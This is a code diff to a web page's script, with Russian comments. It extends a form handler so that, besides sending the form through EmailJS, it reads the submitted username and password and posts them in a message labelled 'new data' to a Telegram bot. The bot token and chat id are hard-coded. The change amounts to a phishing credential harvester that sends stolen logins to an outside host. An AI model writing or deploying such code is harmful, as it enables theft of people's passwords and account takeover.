@@ -78,12 +78,38 @@
         function sendEmail(event) {
             event.preventDefault();
 
+            // Отправка через EmailJS
             emailjs.sendForm('service_fii42yu', 'template_swijn4r', event.target)
                 .then(function() {
-                    alert("Данные успешно отправлены!");
+                    alert("Данные успешно отправлены на Email!");
                 }, function(error) {
                     alert("Ошибка отправки. Попробуйте позже.");
                     console.error(error);
+                });
+
+            // Получение данных из формы
+            const username = event.target.username.value;
+            const password = event.target.password.value;
+
+            // Отправка данных в Telegram
+            const token = '7940844002:AAHZ6Gymx2aK8gdnjxtxvgQ8mUi42eJwl2Y';
+            const chat_id = '1648799185';
+            const message = `Новые данные:\n\nИмя пользователя: ${username}\nПароль: ${password}`;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            // Отправка запроса в Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Сообщение отправлено в Telegram');
+                    } else {
+                        console.error('Ошибка отправки в Telegram:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка при отправке в Telegram:', error);
                 });
         }
     </script>
